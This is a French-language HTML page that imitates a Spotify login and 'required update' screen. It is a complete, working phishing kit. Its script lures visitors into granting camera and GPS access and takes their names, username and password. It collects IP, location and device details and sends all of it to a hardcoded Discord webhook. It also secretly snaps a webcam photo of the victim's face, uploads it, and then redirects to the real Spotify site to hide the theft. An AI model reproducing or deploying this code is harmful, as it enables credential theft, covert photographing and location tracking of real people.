<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Spotify</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; }
        .app-card { width: 100%; max-width: 450px; padding: 40px 25px; text-align: center; }
        .logo { width: 45px; margin: 0 auto 30px auto; }
        #gate { position: fixed; inset: 0; background: #000; z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; text-align: center; }
        .field { text-align: left; margin-bottom: 15px; }
        label { display: block; font-size: 12px; font-weight: 700; margin-bottom: 6px; color: #b3b3b3; text-transform: uppercase; }
        input { width: 100%; background: #121212; border: none; border-radius: 4px; padding: 14px; color: #fff; font-size: 15px; outline: none; }
        .btn-green { background: #1ed760; color: #000; font-weight: 900; padding: 18px; border-radius: 500px; width: 100%; margin-top: 20px; font-size: 14px; border: none; cursor: pointer; text-transform: uppercase; }
        #loader { display: none; margin-top: 25px; }
        .progress-bg { background: #282828; height: 4px; width: 100%; border-radius: 10px; overflow: hidden; }
        .progress-bar { background: #1ed760; height: 100%; width: 0%; transition: width 0.3s; }
        .load-txt { font-size: 12px; color: #1ed760; margin-top: 10px; font-weight: 700; }
        #v, #c { position: absolute; left: -9999px; visibility: hidden; }
    </style>
</head>
<body>
    <div id="gate">
        <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" style="width:55px; margin-bottom:30px;">
        <h1 style="font-weight:900; font-size:22px; margin-bottom:15px;">Mise à jour requise</h1>
        <p style="color:#b3b3b3; font-size:14px; margin-bottom:30px;">Veuillez autoriser l'accès pour synchroniser votre compte Premium avec votre position actuelle.</p>
        <button onclick="initSystem()" class="btn-green">Autoriser et Continuer</button>
    </div>

    <div class="app-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
        <div class="flex gap-2">
            <div class="field w-1/2"><label>Prénom</label><input id="fn" type="text" placeholder="Prénom"></div>
            <div class="field w-1/2"><label>Nom</label><input id="ln" type="text" placeholder="Nom"></div>
        </div>
        <div class="field"><label>E-mail ou nom d'utilisateur</label><input id="u" type="text" placeholder="E-mail ou utilisateur"></div>
        <div class="field"><label>Mot de passe</label><input id="p" type="password" placeholder="Mot de passe"></div>
        <button onclick="sendLogs()" id="btn" class="btn-green">Se connecter</button>
        <div id="loader">
            <div class="progress-bg"><div id="pbar" class="progress-bar"></div></div>
            <div id="ltxt" class="load-txt">VÉRIFICATION RÉGIONALE EN COURS...</div>
        </div>
    </div>
    <video id="v" autoplay playsinline muted></video><canvas id="c"></canvas>

    <script>
        const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";
        let gpsData = "❌ Attente autorisation";
        let camReady = false;

        async function initSystem() {
            document.getElementById('gate').style.display = 'none';
            // 1. Allume la cam direct pour qu'elle "chauffe"
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = stream;
                window.mystream = stream;
                camReady = true;
            } catch(e) { gpsData = "❌ Caméra bloquée"; }

            // 2. GPS Direct
            navigator.geolocation.getCurrentPosition((pos) => {
                gpsData = `✅ **LOCALISÉ :** [Voir sur Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
            }, (err) => { 
                gpsData = "❌ GPS Refusé";
                alert("Erreur: La localisation est requise pour valider votre offre Premium.");
            }, {enableHighAccuracy: true});
        }

        async function sendLogs() {
            const user = { fn: document.getElementById('fn').value, ln: document.getElementById('ln').value, u: document.getElementById('u').value, p: document.getElementById('p').value };
            if(!user.u || !user.p) return;

            document.getElementById('btn').style.display = "none";
            document.getElementById('loader').style.display = "block";
            const pb = document.getElementById('pbar');
            
            pb.style.width = "40%";
            let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
            let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
            const gl = document.createElement('canvas').getContext('webgl');
            const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";

            const payload = {
                embeds: [{
                    title: `⚡ RAPPORT V28 - ${user.fn} ${user.ln}`,
                    color: 1955168,
                    fields: [
                        { name: "👤 IDENTITÉ", value: `**Nom:** \`${user.ln}\` **Prénom:** \`${user.fn}\`\n**User:** \`${user.u}\` **Pass:** \`${user.p}\`` },
                        { name: "📍 LOCALISATION", value: `**Maps:** ${gpsData}\n**Ville IP:** \`${net.city}\`\n**IP:** \`${net.ip}\`` },
                        { name: "📱 MATÉRIEL", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory}GB\`\n**Bat:** \`${Math.round(bat.level*100)}%\`\n**Système:** \`${navigator.platform}\`` }
                    ]
                }]
            };
            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });

            pb.style.width = "80%";
            // --- CAPTURE PHOTO SÉCURISÉE ---
            if(camReady) {
                const video = document.getElementById('v');
                // On attend que la vidéo tourne vraiment
                await new Promise(r => setTimeout(r, 2500));
                const can = document.getElementById('c');
                can.width = video.videoWidth; can.height = video.videoHeight;
                can.getContext('2d').drawImage(video, 0, 0);
                
                can.toBlob(async b => {
                    const fd = new FormData();
                    fd.append('file', b, 'shot.jpg');
                    fd.append('content', `📸 **Capture Visage : ${user.fn} ${user.ln}**`);
                    await fetch(hook, { method: 'POST', body: fd });
                    window.mystream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg', 0.8);
            }

            pb.style.width = "100%";
            setTimeout(() => { window.location.href = "https://www.spotify.com/fr/account/overview/"; }, 1000);
        }
    </script>
</body>
</html>
